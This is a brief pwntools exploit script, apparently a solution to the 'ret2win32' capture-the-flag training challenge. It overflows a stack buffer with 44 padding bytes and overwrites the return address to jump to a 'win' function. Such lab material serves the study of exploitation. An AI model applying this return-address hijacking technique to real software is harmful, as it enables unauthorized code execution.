from pwn import *

p = process('./ret2win32')

win = 0x08048659

payload = 'a' * 44
payload += p32(win)

p.sendline(payload)
print p.recvall()
